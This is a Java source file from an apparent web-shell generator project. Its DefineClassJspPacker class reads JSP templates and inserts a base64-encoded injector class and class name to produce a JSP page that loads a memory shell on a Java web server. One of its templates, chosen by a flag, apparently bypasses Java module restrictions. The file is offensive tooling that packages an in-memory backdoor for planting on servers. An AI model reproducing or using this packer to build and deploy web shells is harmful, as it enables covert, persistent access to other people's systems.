package com.reajason.javaweb.memshell.packer.jsp;

import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;
import lombok.SneakyThrows;
import org.apache.commons.io.IOUtils;

import java.nio.charset.Charset;
import java.util.Objects;

/**
 * @author ReaJason
 * @since 2024/11/26
 */
public class DefineClassJspPacker implements Packer {

    String template = null;
    String bypassTemplate = null;

    public DefineClassJspPacker() {
        try {
            template = IOUtils.toString(Objects.requireNonNull(this.getClass().getResourceAsStream("/shell1.jsp")), Charset.defaultCharset());
            bypassTemplate = IOUtils.toString(Objects.requireNonNull(this.getClass().getResourceAsStream("/shell2.jsp")), Charset.defaultCharset());
        } catch (Exception ignored) {

        }
    }

    @Override
    @SneakyThrows
    public String pack(GenerateResult generateResult) {
        String injectorBytesBase64Str = generateResult.getInjectorBytesBase64Str();
        String injectorClassName = generateResult.getInjectorClassName();
        String template = this.template;
        if (generateResult.getShellConfig().needByPassJavaModule()) {
            template = bypassTemplate;
        }
        return template.replace("{{className}}", injectorClassName)
                .replace("{{base64Str}}", injectorBytesBase64Str);
    }
}